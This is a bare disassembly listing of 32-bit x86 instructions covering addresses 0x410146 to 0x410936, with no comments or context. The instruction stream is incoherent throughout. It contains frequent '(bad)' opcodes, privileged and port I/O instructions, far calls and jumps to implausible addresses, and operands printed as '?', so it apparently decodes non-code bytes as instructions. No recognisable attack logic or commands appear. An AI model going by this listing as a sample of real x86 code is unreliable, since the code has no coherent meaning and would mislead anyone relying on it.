  410146:	not    BYTE PTR [edi-0x51]
  410149:	adc    ch,BYTE PTR [edx]
  41014b:	(bad)  
  41014c:	adc    ecx,eax
  41014e:	sbb    edx,DWORD PTR [ecx-0x62]
  410151:	loope  0x410107
  410153:	repnz mov al,0xa4
  410156:	push   edi
  410157:	cli    
  410158:	test   eax,0xdc3e0106
  41015d:	push   ds
  41015e:	xchg   esi,eax
  41015f:	(bad)  
  410160:	jae    0x4100fc
  410162:	add    ch,cl
  410164:	cld    
  410165:	(bad)  
  410166:	loope  0x41015a
  410168:	and    ah,dh
  41016a:	pop    es
  41016b:	sub    DWORD PTR [ebx-0x2aca2cf3],ebx
  410171:	add    ch,bh
  410173:	inc    ebx
  410174:	and    ah,al
  410176:	stos   DWORD PTR es:[edi],eax
  410177:	jb     0x4101c0
  410179:	xchg   ecx,eax
  41017a:	add    dl,al
  41017c:	lods   eax,DWORD PTR ds:[esi]
  41017d:	or     esi,DWORD PTR [ebx+0xf]
  410180:	jb     0x410198
  410182:	xor    eax,0x4f95913e
  410187:	inc    esp
  410188:	cli    
  410189:	(bad)  
  41018a:	pop    ecx
  41018b:	rol    dl,cl
  41018d:	test   DWORD PTR [esi],edi
  41018f:	daa    
  410190:	jecxz  0x410151
  410192:	call   0xce6fd8cc
  410197:	jg     0x4101cb
  410199:	int    0xbd
  41019b:	jo     0x4101b0
  41019d:	xchg   esp,eax
  41019e:	das    
  41019f:	(bad)  
  4101a0:	iret   
  4101a1:	(bad)  
  4101a2:	xchg   esp,eax
  4101a3:	repnz sub eax,0xa102e080
  4101a9:	test   eax,0xc61a3d26
  4101ae:	fistp  DWORD PTR [esi+ebx*4-0x2]
  4101b2:	xor    BYTE PTR [eax],cl
  4101b4:	dec    esi
  4101b5:	int3   
  4101b6:	jns    0x410138
  4101b8:	pop    ebp
  4101b9:	pop    edx
  4101ba:	push   ebx
  4101bb:	sbb    esi,DWORD PTR [esi-0xa]
  4101be:	and    ah,BYTE PTR [edx-0x1f0fc0be]
  4101c4:	adc    esp,esp
  4101c6:	jg     0x4101c1
  4101c8:	and    ah,cl
  4101ca:	or     eax,DWORD PTR [edx+0x5d]
  4101cd:	iret   
  4101ce:	test   al,0xee
  4101d0:	xchg   DWORD PTR [edx+0x21],ecx
  4101d3:	push   ebx
  4101d4:	ss mov ch,0x29
  4101d7:	push   cs
  4101d8:	add    BYTE PTR [edi+0xb2d2be4],ch
  4101de:	push   ds
  4101df:	lods   al,BYTE PTR ds:[esi]
  4101e0:	aad    0x36
  4101e2:	push   ebx
  4101e3:	lds    ebx,FWORD PTR [ebx-0x39]
  4101e6:	adc    DWORD PTR [edx+ebp*2-0x6df178a3],ecx
  4101ed:	jmp    0xffe6ddd4
  4101f2:	adc    bh,BYTE PTR [edi+0x7d]
  4101f5:	(bad)  
  4101f6:	adc    eax,0x574bb5b4
  4101fb:	jno    0x410211
  4101fd:	mov    al,ds:0xbbdfdef4
  410202:	ins    DWORD PTR es:[edi],dx
  410203:	bound  ebp,QWORD PTR [eax]
  410205:	cmp    DWORD PTR [ebp+eax*2-0x6100380e],ecx
  41020c:	out    dx,eax
  41020d:	mov    bl,0x4
  41020f:	(bad)  
  410211:	pop    eax
  410212:	or     ch,BYTE PTR [eax-0x74]
  410215:	push   ds
  410216:	ret    0xf402
  410219:	shr    DWORD PTR [esi+0x3a],cl
  41021c:	dec    ecx
  41021d:	les    ebx,FWORD PTR [esi-0x39]
  410220:	js     0x4101f0
  410222:	adc    eax,0x28187151
  410227:	cdq    
  410228:	lock pusha 
  41022a:	(bad)  
  41022b:	push   ecx
  41022c:	jecxz  0x4101ce
  41022e:	mov    al,0xd8
  410230:	idiv   esi
  410232:	mov    eax,ds:0x89a8eb0b
  410237:	gs pop eax
  410239:	cdq    
  41023a:	pop    esi
  41023b:	leave  
  41023c:	jecxz  0x4101fd
  41023e:	in     al,dx
  41023f:	nop
  410240:	scas   eax,DWORD PTR es:[edi]
  410241:	cwde   
  410242:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410243:	jge    0x4102c0
  410245:	push   ebp
  410246:	pop    edi
  410247:	and    BYTE PTR [ebp-0x5846ef77],ah
  41024d:	mov    esp,gs
  41024f:	or     BYTE PTR [edx+0x5e],bh
  410252:	aam    0xe6
  410254:	test   al,0xbc
  410256:	pop    eax
  410257:	adc    BYTE PTR [edi],ah
  410259:	fs pop ss
  41025b:	pop    ebp
  41025c:	push   edx
  41025d:	dec    ecx
  41025e:	mov    ebx,0x3108535
  410263:	mov    WORD PTR [ebx+0x39ef8bb2],?
  410269:	push   ds
  41026a:	nop
  41026b:	mov    ?,WORD PTR [eax+0xe]
  41026e:	ss fcmovnu st,st(1)
  410271:	pop    ds
  410272:	jge    0x410239
  410274:	mov    al,cl
  410276:	shr    BYTE PTR [ebp+0x5e],cl
  410279:	jo     0x410286
  41027b:	pushf  
  41027c:	ins    BYTE PTR es:[edi],dx
  41027d:	sbb    ch,BYTE PTR [eax-0xa73cd8]
  410283:	dec    esp
  410284:	inc    ebp
  410285:	ret    
  410286:	bound  esp,QWORD PTR [edx-0x27]
  410289:	test   DWORD PTR [edx+0x1a],0x38edd5c5
  410290:	ins    DWORD PTR es:[edi],dx
  410291:	sar    dh,1
  410293:	xor    edx,DWORD PTR [ebx-0x73]
  410296:	pop    eax
  410297:	xchg   ebp,eax
  410298:	(bad)  
  410299:	(bad)  
  41029a:	dec    eax
  41029b:	mov    ah,0x64
  41029d:	cmp    bl,cl
  41029f:	repz int3 
  4102a1:	xchg   esi,eax
  4102a2:	pop    edi
  4102a3:	(bad)  
  4102a4:	pop    ecx
  4102a5:	jecxz  0x410321
  4102a7:	or     DWORD PTR [esi+0x508e541],edi
  4102ad:	and    dl,0xc3
  4102b0:	arpl   WORD PTR [edx-0x11],si
  4102b3:	retf   0xb1b8
  4102b6:	in     eax,dx
  4102b7:	mov    ebp,0x3b31fe83
  4102bc:	in     al,dx
  4102bd:	jge    0x410283
  4102bf:	stos   BYTE PTR es:[edi],al
  4102c0:	push   0x17e44882
  4102c5:	mov    eax,0x2c9949e2
  4102ca:	mov    tr3,ecx
  4102cd:	xchg   DWORD PTR [edi-0x1b51e65f],esp
  4102d3:	pop    ebx
  4102d4:	int3   
  4102d5:	fcom   QWORD PTR [ebx-0x19]
  4102d8:	jnp    0x410265
  4102da:	into   
  4102db:	dec    al
  4102dd:	mov    ebp,esi
  4102df:	popf   
  4102e0:	cmp    edx,DWORD PTR [edi-0x346f9142]
  4102e6:	mov    ch,0x60
  4102e8:	jmp    0x410360
  4102ea:	jp     0x410293
  4102ec:	add    eax,0x708e6ed1
  4102f1:	inc    ebx
  4102f2:	jmp    0xa124:0xafd6f1dc
  4102f9:	shl    BYTE PTR [ebx+ecx*4-0x3],1
  4102fd:	push   edi
  4102fe:	inc    edi
  4102ff:	mov    edi,0x540b6f48
  410304:	jge    0x4102a0
  410306:	add    ecx,DWORD PTR [esi-0x673b35b3]
  41030c:	inc    ebx
  41030d:	jo     0x410308
  41030f:	aam    0x58
  410311:	sub    dh,BYTE PTR [edx]
  410313:	arpl   WORD PTR [ebx-0x29936e],ax
  410319:	xchg   ebp,ecx
  41031b:	pop    eax
  41031c:	fist   WORD PTR [ecx+0x612a8584]
  410322:	sahf   
  410323:	or     ecx,edi
  410325:	inc    eax
  410326:	das    
  410327:	popa   
  410328:	retf   
  410329:	pop    eax
  41032a:	cwde   
  41032b:	into   
  41032c:	cmc    
  41032d:	or     esp,DWORD PTR [edx-0x627e59eb]
  410333:	nop
  410334:	fstp   DWORD PTR [ebx]
  410336:	jmp    0xbf89:0xa8edab22
  41033d:	stc    
  41033e:	sar    DWORD PTR [eax-0x73],cl
  410341:	jmp    0x41031b
  410343:	ret    0x1d9d
  410346:	in     eax,dx
  410347:	loope  0x410335
  410349:	sub    bh,bh
  41034b:	in     eax,dx
  41034c:	xchg   edx,eax
  41034d:	pop    eax
  41034e:	or     al,BYTE PTR [ebp-0x185f9239]
  410354:	add    dl,BYTE PTR [esi+0x175d3e14]
  41035a:	or     edi,0x4e
  41035d:	xchg   DWORD PTR [ebp+0x3c],esi
  410360:	sub    eax,0x6799decb
  410365:	sete   BYTE PTR [edi]
  410368:	sbb    eax,0x74d2a6cf
  41036d:	jmp    0x6031d98f
  410372:	cmp    cl,BYTE PTR [edx-0x75efe5ca]
  410378:	jne    0x4103ab
  41037a:	jns    0x410345
  41037c:	shld   DWORD PTR [esi+0x40d1c5],edx,cl
  410383:	ds pop ds
  410385:	pop    ebp
  410386:	push   ds
  410387:	pop    esi
  410388:	push   ebx
  410389:	push   0x44
  41038b:	sti    
  41038c:	call   0x490b:0x88338e6c
  410393:	push   edi
  410394:	clc    
  410395:	int3   
  410396:	call   0xe7f1:0xed956fbc
  41039d:	int    0x4a
  41039f:	ds sbb al,0x43
  4103a2:	jmp    0xf184:0xdeef3a53
  4103a9:	cld    
  4103aa:	adc    BYTE PTR [esi+0x32],ch
  4103ad:	(bad)  
  4103ae:	fcmove st,st(6)
  4103b0:	je     0x410404
  4103b2:	sbb    eax,0x5e14f64c
  4103b7:	fs dec edx
  4103b9:	push   0x36
  4103bb:	add    al,0x4b
  4103bd:	xchg   esp,eax
  4103be:	out    0x79,al
  4103c0:	outs   dx,BYTE PTR ds:[esi]
  4103c1:	pushf  
  4103c2:	dec    ecx
  4103c3:	xchg   DWORD PTR [edx-0x5d],ebp
  4103c6:	int    0xe2
  4103c8:	add    al,0x26
  4103ca:	push   0xffffffad
  4103cc:	mov    bl,0xe5
  4103ce:	push   edx
  4103cf:	mov    ch,0x77
  4103d1:	leave  
  4103d2:	or     eax,0x7f1fdbb6
  4103d7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4103d8:	inc    ebx
  4103d9:	adc    ebp,DWORD PTR [edx+0x728a500c]
  4103df:	mov    ch,0x69
  4103e1:	dec    esi
  4103e2:	mov    ch,0x82
  4103e4:	sbb    BYTE PTR [edx],bl
  4103e6:	mov    ch,0xf3
  4103e8:	mov    al,0x78
  4103ea:	pop    edi
  4103eb:	or     BYTE PTR [eax+0x8b082ba],ah
  4103f1:	(bad)  
  4103f3:	add    ebx,DWORD PTR [ecx]
  4103f5:	pop    eax
  4103f6:	push   esi
  4103f7:	push   ebp
  4103f8:	imul   DWORD PTR [edx]
  4103fa:	(bad)  
  4103fb:	jmp    0x41042c
  4103fd:	sahf   
  4103fe:	xchg   ecx,eax
  4103ff:	ins    BYTE PTR es:[edi],dx
  410400:	add    BYTE PTR [ecx+0xd2b32a9],0xdf
  410407:	jge    0x410453
  410409:	outs   dx,BYTE PTR ds:[esi]
  41040a:	mov    al,bh
  41040c:	cli    
  41040d:	out    0x5e,eax
  41040f:	sbb    eax,0x9c686a47
  410414:	mov    bl,0xe0
  410416:	sar    ah,1
  410418:	bound  ebx,QWORD PTR [ebx+edx*4]
  41041b:	xor    bl,BYTE PTR [eax]
  41041d:	cs or  ebp,ebx
  410420:	enter  0x2191,0xed
  410424:	fsubp  st(7),st
  410426:	sub    esi,DWORD PTR [edx+0x53]
  410429:	mov    DWORD PTR [edx+edx*1],ebx
  41042c:	jmp    0x9fd5d4c6
  410431:	jo     0x410401
  410433:	mov    edi,0xe54d89ea
  410438:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410439:	int3   
  41043a:	in     eax,dx
  41043b:	add    eax,0xdce1864e
  410440:	push   edi
  410441:	mov    DWORD PTR [edi],ecx
  410443:	cld    
  410444:	fiadd  DWORD PTR [esi+esi*1]
  410447:	sbb    BYTE PTR [eax],bl
  410449:	xchg   esp,eax
  41044a:	add    al,0x14
  41044c:	repz loope 0x4104be
  41044f:	mov    ebx,0xf6ea0230
  410454:	jbe    0x4104af
  410456:	jmp    0xab8ee1b7
  41045b:	xor    edx,esi
  41045d:	jne    0x4104cb
  41045f:	push   eax
  410460:	sbb    BYTE PTR [eax-0x6b],bl
  410463:	and    BYTE PTR [edx+0x58d88a1a],bh
  410469:	leave  
  41046a:	ins    DWORD PTR es:[edi],dx
  41046b:	jp     0x4104cd
  41046d:	jbe    0x41043a
  41046f:	stos   DWORD PTR es:[edi],eax
  410470:	ss xor al,0xb6
  410473:	add    esp,DWORD PTR [esi-0x2a1cc681]
  410479:	imul   ebp,edi,0x6cc49221
  41047f:	sti    
  410480:	(bad)  
  410481:	imul   eax,DWORD PTR [esi+eax*4],0x38d8b247
  410488:	mov    dh,0x5f
  41048a:	pop    ebp
  41048b:	xor    DWORD PTR [ebp+0x42],ebx
  41048e:	fdiv   DWORD PTR [eax+0x27]
  410491:	xor    cl,bl
  410493:	enter  0x12d0,0x1c
  410497:	popa   
  410498:	aas    
  410499:	pop    esi
  41049a:	adc    esi,ebx
  41049c:	(bad)
  41049f:	fucom  st(0)
  4104a1:	out    0x97,eax
  4104a3:	iret   
  4104a4:	mov    esi,0xfaed80c4
  4104a9:	sti    
  4104aa:	sub    BYTE PTR [edi-0x336ccd55],al
  4104b0:	mov    al,0xfd
  4104b2:	sbb    al,0xae
  4104b4:	in     al,0xe8
  4104b6:	xchg   ebx,eax
  4104b7:	cmp    eax,0x4cf1e240
  4104bc:	repz add ebp,esi
  4104bf:	in     eax,dx
  4104c0:	rcr    DWORD PTR [edx-0x46],0x46
  4104c4:	cdq    
  4104c5:	mov    edx,0x9ed6f801
  4104ca:	ins    BYTE PTR es:[edi],dx
  4104cb:	mov    esi,0x792061f1
  4104d0:	std    
  4104d1:	(bad)  
  4104d3:	pop    esi
  4104d4:	adc    ch,BYTE PTR [edx]
  4104d6:	daa    
  4104d7:	sbb    BYTE PTR [eax+ebp*2],ah
  4104da:	pushf  
  4104db:	sbb    bh,bh
  4104dd:	pop    edi
  4104de:	lock jecxz 0x41048a
  4104e1:	or     DWORD PTR [eax-0x675f842c],eax
  4104e7:	jne    0x4104f2
  4104e9:	jae    0x41047e
  4104eb:	int3   
  4104ec:	in     al,0x16
  4104ee:	mov    cl,0xbe
  4104f0:	punpckhbw mm4,QWORD PTR [ebx-0x18]
  4104f4:	inc    edi
  4104f5:	mov    ds:0x931af78d,eax
  4104fa:	mov    ah,0xa3
  4104fc:	push   edx
  4104fd:	cwde   
  4104fe:	xchg   ax,ax
  410500:	cmp    al,0x79
  410502:	push   ecx
  410503:	shl    DWORD PTR ds:[esi],1
  410506:	outs   dx,DWORD PTR ds:[esi]
  410507:	xor    esi,ebp
  410509:	xchg   esi,eax
  41050a:	push   edx
  41050b:	dec    edi
  41050c:	xchg   BYTE PTR [edi+edi*1],dh
  41050f:	sub    al,0x27
  410511:	mov    BYTE PTR [ebx],bl
  410513:	pop    ebp
  410514:	push   0x1b
  410516:	call   0x998c22f8
  41051b:	(bad)
  41051e:	rcl    BYTE PTR [edi-0x5d],cl
  410521:	enter  0x3284,0x91
  410525:	gs std 
  410527:	xchg   esp,eax
  410528:	ja     0x4104fe
  41052a:	cmc    
  41052b:	in     al,dx
  41052c:	jle    0x41051e
  41052e:	push   cs
  41052f:	xor    DWORD PTR es:[eax],edi
  410532:	repnz mov esi,0xcb596b99
  410538:	dec    eax
  410539:	(bad)  
  41053a:	outs   dx,BYTE PTR ds:[esi]
  41053b:	pop    edi
  41053c:	pop    ebp
  41053d:	data16 (bad) 
  41053f:	js     0x4104e8
  410541:	outs   dx,BYTE PTR ds:[esi]
  410542:	nop
  410543:	jge    0x41057d
  410545:	sbb    al,ch
  410547:	shr    DWORD PTR [esi+0xd],cl
  41054a:	outs   dx,DWORD PTR ds:[esi]
  41054b:	jae    0x41058d
  41054d:	add    BYTE PTR [edi-0x1a],0x26
  410551:	push   ebp
  410552:	inc    ebp
  410553:	cmp    esi,ebx
  410555:	pop    es
  410556:	mov    ah,0x3
  410558:	call   0x1f94:0x9ba5ad45
  41055f:	cmc    
  410560:	lods   al,BYTE PTR ds:[esi]
  410561:	dec    esp
  410562:	fld    DWORD PTR [edx-0x2d]
  410565:	(bad)  
  410567:	(bad)  
  410568:	cs es jns 0x41050b
  41056c:	lods   al,BYTE PTR ds:[esi]
  41056d:	and    ah,dh
  41056f:	sub    eax,0xef47ea73
  410574:	or     DWORD PTR [ecx+0x590b9aaf],eax
  41057a:	fmul   DWORD PTR [edi+0x1c9c68e3]
  410580:	loop   0x410520
  410582:	or     BYTE PTR [ebx],al
  410584:	jae    0x410535
  410586:	pop    ebx
  410587:	fild   DWORD PTR [ecx-0x1c405a70]
  41058d:	cwde   
  41058e:	xor    DWORD PTR [ebx],0xffffffb1
  410591:	imul   eax,ebp,0x18
  410594:	mov    ah,0xce
  410596:	ficom  DWORD PTR [ecx+0x7b9a2429]
  41059c:	add    al,0x20
  41059e:	fild   WORD PTR [ebx-0x47f6830f]
  4105a4:	call   0x28a30b58
  4105a9:	jle    0x4105cc
  4105ab:	mov    ecx,DWORD PTR [edx-0x6a09d162]
  4105b1:	adc    ch,ch
  4105b3:	xor    al,0xdf
  4105b5:	sbb    bl,BYTE PTR [ebx+0x63936be1]
  4105bb:	xor    al,0x41
  4105bd:	outs   dx,DWORD PTR ds:[esi]
  4105be:	push   edi
  4105bf:	or     BYTE PTR [ebx-0x4e],0x33
  4105c3:	sub    ah,BYTE PTR [edi]
  4105c5:	mov    al,0x68
  4105c7:	ja     0x410629
  4105c9:	shl    ebp,1
  4105cb:	push   eax
  4105cc:	cmp    dl,cl
  4105ce:	call   0x8749:0x3a2db264
  4105d5:	test   al,0x9a
  4105d8:	mov    edi,0xe52f816f
  4105dd:	mov    ds:0xbfe57240,eax
  4105e2:	xchg   esp,eax
  4105e3:	mov    ebp,0xa7293a10
  4105e8:	xchg   ebx,esp
  4105ea:	shl    BYTE PTR [esi+edi*8+0x515ce5da],0x92
  4105f2:	sub    al,0x19
  4105f4:	fld    DWORD PTR [esi-0x6b]
  4105f7:	cmp    eax,0x61248f23
  4105fc:	dec    edi
  4105fd:	cdq    
  4105fe:	or     ah,dh
  410600:	dec    eax
  410601:	push   esp
  410602:	pop    es
  410603:	xchg   esp,eax
  410604:	loop   0x41066a
  410606:	and    eax,0xbd30b4f6
  41060b:	adc    DWORD PTR ds:0xac27df2b,edi
  410611:	or     BYTE PTR ds:0xa480148c,ah
  410617:	sti    
  410618:	std    
  410619:	add    BYTE PTR [ebx],bl
  41061b:	ret    0x1651
  41061e:	dec    edx
  41061f:	fst    QWORD PTR [edx+edx*1]
  410622:	aad    0x9d
  410624:	push   0x27
  410626:	or     DWORD PTR [ecx+0x3fce430],eax
  41062c:	ins    DWORD PTR es:[edi],dx
  41062d:	sti    
  41062e:	(bad)  
  41062f:	test   BYTE PTR [ebx-0x26cec9dc],0xbd
  410636:	sbb    DWORD PTR [ecx+0x4610a02a],ecx
  41063c:	std    
  41063d:	mov    cl,0x44
  41063f:	aad    0x14
  410641:	dec    edi
  410642:	ror    BYTE PTR [ecx+0x3e8a2145],cl
  410648:	adc    DWORD PTR [esi-0x2b],esp
  41064b:	ss cmp bl,cl
  41064e:	outs   dx,BYTE PTR ds:[esi]
  41064f:	test   al,0x76
  410651:	pusha  
  410652:	sub    bl,cl
  410654:	pop    esp
  410655:	cwde   
  410656:	and    eax,0x96880223
  41065b:	xor    DWORD PTR [edx+0x1b44d715],eax
  410661:	inc    ecx
  410662:	jbe    0x4106b2
  410664:	pop    esp
  410665:	icebp  
  410666:	mov    edx,0xdd1eee4a
  41066b:	scas   eax,DWORD PTR es:[edi]
  41066c:	aaa    
  41066d:	mov    cl,0xc7
  41066f:	test   bl,dl
  410671:	dec    esp
  410672:	add    ecx,DWORD PTR fs:0xcd84c4c8
  410679:	mov    ch,0x94
  41067b:	sub    eax,DWORD PTR [edi+0x39f3388]
  410681:	test   eax,0xc49cfce5
  410686:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410687:	aam    0x6
  410689:	lock jnp 0x41066d
  41068c:	stc    
  41068d:	add    al,0x4e
  41068f:	int3   
  410690:	jns    0x4106e8
  410692:	pop    eax
  410693:	jns    0x4106c9
  410695:	ds dec edx
  410697:	mov    ecx,0xb1761aba
  41069c:	xchg   ebp,eax
  41069d:	ins    BYTE PTR es:[edi],dx
  41069e:	out    0xeb,eax
  4106a0:	bound  eax,QWORD PTR [edi-0x67ac54ba]
  4106a6:	sbb    dh,BYTE PTR [eax+edx*8-0xbfc11b2]
  4106ad:	and    BYTE PTR [edx],ah
  4106af:	loop   0x4106aa
  4106b1:	mov    eax,0xf69d60fa
  4106b6:	and    ebx,DWORD PTR [ebx-0x16ccc9c4]
  4106bc:	lods   al,BYTE PTR ds:[esi]
  4106bd:	popa   
  4106be:	xchg   ch,bl
  4106c0:	mov    DWORD PTR [edi+0x3cfeb0d5],edi
  4106c6:	xchg   esp,eax
  4106c7:	cld    
  4106c8:	daa    
  4106c9:	loopne 0x410653
  4106cb:	sub    al,0x32
  4106cd:	(bad)  
  4106ce:	out    dx,eax
  4106cf:	out    0xc6,al
  4106d1:	cli    
  4106d2:	jb     0x4106aa
  4106d4:	mov    ds:0x565ebe04,al
  4106d9:	inc    esp
  4106da:	call   FWORD PTR [ebx+0x3293e8fe]
  4106e0:	xchg   esi,eax
  4106e1:	hlt    
  4106e2:	lds    ebp,FWORD PTR [esi+ebp*8-0x5f841025]
  4106e9:	mov    ah,0xd
  4106eb:	mov    eax,ds:0xaee5ebf1
  4106f0:	push   edx
  4106f1:	mov    dh,0x28
  4106f3:	shl    DWORD PTR [ebp+esi*2-0x64],cl
  4106f7:	pusha  
  4106f8:	pop    ds
  4106f9:	push   es
  4106fa:	dec    esi
  4106fb:	lea    edi,[ebp-0x3e]
  4106fe:	jecxz  0x41068e
  410700:	push   ss
  410701:	lods   eax,DWORD PTR ds:[esi]
  410702:	inc    ebx
  410703:	stc    
  410704:	ret    0xa119
  410707:	aaa    
  410708:	arpl   WORD PTR [eax-0x638b9d89],dx
  41070e:	inc    BYTE PTR [ebx]
  410710:	cmp    ah,bh
  410712:	popa   
  410713:	sbb    DWORD PTR [edi-0x2a],edx
  410716:	cmps   DWORD PTR cs:[esi],DWORD PTR es:[edi]
  410718:	mov    dl,0xdd
  41071a:	sbb    BYTE PTR [edx+edi*4+0xe77825],ah
  410721:	mov    ebx,0x1f23f13b
  410726:	add    eax,0x4fe1f65e
  41072b:	into   
  41072c:	cmp    al,0x31
  41072e:	out    dx,al
  41072f:	aas    
  410730:	scas   al,BYTE PTR es:[edi]
  410731:	mov    ds:0x30b44396,eax
  410736:	pop    edi
  410737:	hlt    
  410738:	int3   
  410739:	inc    esi
  41073a:	push   esp
  41073b:	mov    edi,0xe1685979
  410740:	cmp    bh,BYTE PTR [edx-0x10d8cbbe]
  410746:	adc    esp,esi
  410748:	daa    
  410749:	mov    BYTE PTR [ebx],bh
  41074b:	scas   al,BYTE PTR es:[edi]
  41074c:	mov    ch,dh
  41074e:	push   es
  41074f:	sub    esp,DWORD PTR ds:0xea62bd45
  410755:	cwde   
  410756:	or     al,0x26
  410758:	sbb    edx,DWORD PTR [esi]
  41075a:	adc    eax,0xb4374431
  41075f:	clc    
  410760:	mov    ch,0x78
  410762:	stc    
  410763:	push   ds
  410764:	push   edi
  410765:	sti    
  410766:	add    al,0xb1
  410768:	shl    DWORD PTR [esp+edx*2-0x53],cl
  41076c:	aam    0x27
  41076e:	dec    ebp
  41076f:	hlt    
  410770:	add    BYTE PTR [ecx+0x10c2a1db],bl
  410776:	pusha  
  410777:	jbe    0x4107cd
  410779:	cmc    
  41077a:	jg     0x4107b2
  41077c:	add    eax,0x98e23183
  410781:	mov    ebp,0xe70482e2
  410786:	mov    bl,0xb0
  410788:	sub    ebp,DWORD PTR [ecx]
  41078a:	sbb    eax,0xed1c4d2d
  41078f:	iret   
  410790:	or     bl,al
  410792:	retf   0x4131
  410795:	test   al,0x3
  410797:	dec    ebx
  410798:	jmp    0x18fa:0x844d85
  41079f:	call   0x72927408
  4107a4:	call   0xd931:0xd3d035d0
  4107ab:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4107ac:	push   esi
  4107ad:	pop    esi
  4107ae:	cwde   
  4107af:	fiadd  WORD PTR [esi-0x5440e239]
  4107b5:	inc    BYTE PTR [esi+0x6a]
  4107b8:	stc    
  4107b9:	sti    
  4107ba:	sbb    DWORD PTR [ecx],ebx
  4107bc:	or     ah,dh
  4107be:	arpl   WORD PTR [ebx],bp
  4107c0:	dec    eax
  4107c1:	outs   dx,BYTE PTR ds:[esi]
  4107c2:	add    DWORD PTR [eax+0x32],edx
  4107c5:	dec    eax
  4107c6:	and    bl,BYTE PTR [edx]
  4107c8:	jmp    0x4107a1
  4107ca:	mov    eax,0xa26da995
  4107cf:	call   0xcada9333
  4107d4:	jns    0x41077f
  4107d6:	ffreep st(3)
  4107d8:	popa   
  4107d9:	lock xor al,0x54
  4107dc:	cwde   
  4107dd:	or     esp,eax
  4107df:	jge    0x410789
  4107e1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4107e2:	int3   
  4107e3:	fbld   TBYTE PTR [ebp-0x3c53a986]
  4107e9:	mov    ds:0xa69f7ef4,eax
  4107ee:	pop    esi
  4107ef:	sahf   
  4107f0:	jbe    0x410871
  4107f2:	fisttp QWORD PTR [ecx-0x52cf5cdb]
  4107f8:	jle    0x410827
  4107fa:	imul   esp,DWORD PTR [ecx-0x1e],0x85500d2f
  410801:	mov    esp,DWORD PTR [esi]
  410803:	pop    edx
  410804:	jmp    0x410820
  410806:	jmp    0x5264:0x7bcde52d
  41080d:	jo     0x4107ad
  41080f:	push   eax
  410810:	mov    eax,ds:0x2ba24e5b
  410815:	loop   0x4107cb
  410817:	loopne 0x410867
  410819:	xor    DWORD PTR [ebx],edi
  41081b:	cmp    dl,BYTE PTR [edx+0x2483e01f]
  410821:	rol    esp,0x6f
  410824:	dec    ebp
  410825:	jmp    0x61f6eac2
  41082a:	xchg   edx,eax
  41082b:	cmps   BYTE PTR ds:[si],BYTE PTR es:[di]
  41082d:	sub    esp,DWORD PTR [ebx-0x3f]
  410830:	xor    DWORD PTR ss:[esi],eax
  410833:	lahf   
  410834:	jmp    0x4107fa
  410836:	push   eax
  410837:	test   al,0x4
  410839:	sahf   
  41083a:	jmp    DWORD PTR [esi+0x52]
  41083d:	jmp    0xf0a51501
  410842:	mov    edi,esi
  410844:	mov    DWORD PTR [edi],esp
  410846:	push   ebp
  410847:	ss mov ch,0x66
  41084a:	bnd jge 0x4108ae
  41084d:	inc    ebx
  41084e:	push   esp
  41084f:	adc    bh,bh
  410851:	inc    eax
  410852:	sub    ah,BYTE PTR [ebp+0x56]
  410855:	cmp    eax,0x8100fb82
  41085a:	loopne 0x4108bc
  41085c:	dec    ecx
  41085d:	mov    eax,0xe62a13d7
  410862:	sub    al,0xbd
  410864:	adc    esp,DWORD PTR [ecx+0x6fd3a5ea]
  41086a:	call   0x34c675a8
  41086f:	arpl   WORD PTR [ebx-0x77],ax
  410872:	push   ecx
  410873:	push   esi
  410874:	stos   BYTE PTR es:[edi],al
  410875:	and    DWORD PTR [edi+0x23ee2a44],edi
  41087b:	ins    BYTE PTR es:[edi],dx
  41087c:	neg    DWORD PTR [edi+0x4a36dec7]
  410882:	fsub   DWORD PTR [ebx-0x3d]
  410885:	and    BYTE PTR [edi+0x3b],bl
  410888:	(bad)  [ecx-0x66c1daeb]
  41088e:	or     BYTE PTR [edx],ch
  410890:	xchg   ecx,eax
  410891:	enter  0x30a,0xd7
  410895:	rcl    DWORD PTR [ebp-0x5b],1
  410898:	adc    eax,0x9ebfe53f
  41089d:	pop    edi
  41089e:	or     edi,DWORD PTR [ebp+0xd]
  4108a1:	shl    BYTE PTR [ecx],1
  4108a3:	loop   0x41084a
  4108a5:	or     DWORD PTR [esi-0x5610880c],0xb7a47a70
  4108af:	mov    dh,0xa
  4108b1:	in     al,0xa1
  4108b3:	jbe    0x41092d
  4108b5:	inc    edx
  4108b6:	lods   al,BYTE PTR ds:[esi]
  4108b7:	adc    al,0xfb
  4108b9:	jmp    0xe0bbc770
  4108be:	call   DWORD PTR [edx-0x2e]
  4108c1:	sar    DWORD PTR [eax+0x3c],1
  4108c4:	sub    bh,BYTE PTR [ebx]
  4108c6:	fiadd  WORD PTR [ecx]
  4108c8:	rcr    BYTE PTR [edx],cl
  4108ca:	sub    ebx,edi
  4108cc:	(bad)  
  4108cd:	and    al,0xd3
  4108cf:	push   0x72b321cd
  4108d4:	loope  0x4108fa
  4108d6:	jmp    0x4108f2
  4108d8:	fcom   QWORD PTR [ecx-0x48]
  4108db:	inc    BYTE PTR [ecx-0x27]
  4108de:	call   0xe489862c
  4108e3:	es daa 
  4108e5:	das    
  4108e6:	daa    
  4108e7:	mov    dh,0x92
  4108e9:	into   
  4108ea:	mov    bh,0x2c
  4108ec:	jns    0x4108fb
  4108ee:	and    eax,0x7dcdc966
  4108f3:	call   0x49a639d6
  4108f8:	fisttp DWORD PTR [esp+eiz*8+0x58fb4f6f]
  4108ff:	sub    al,0x26
  410901:	fcmovnb st,st(7)
  410903:	sahf   
  410904:	out    0x59,eax
  410906:	stos   BYTE PTR es:[edi],al
  410907:	jbe    0x4108e4
  410909:	mov    al,0x88
  41090b:	fld    TBYTE PTR [ecx+edx*1+0x76]
  41090f:	pusha  
  410910:	cmp    esi,DWORD PTR [eax-0x33]
  410913:	cmp    al,0x83
  410915:	dec    esp
  410916:	mov    edi,0xe303c01a
  41091b:	rcl    BYTE PTR [edi+0x16],cl
  41091e:	hlt    
  41091f:	idiv   BYTE PTR [edi+edx*8]
  410922:	cli    
  410923:	cdq    
  410924:	stos   DWORD PTR es:[edi],eax
  410925:	test   al,0x11
  410927:	or     edx,eax
  410929:	push   cs
  41092a:	mov    ah,0xda
  41092c:	mov    eax,0x9defe304
  410931:	or     eax,0xd62222a9
  410936:	add    DWORD PTR [edi],esp
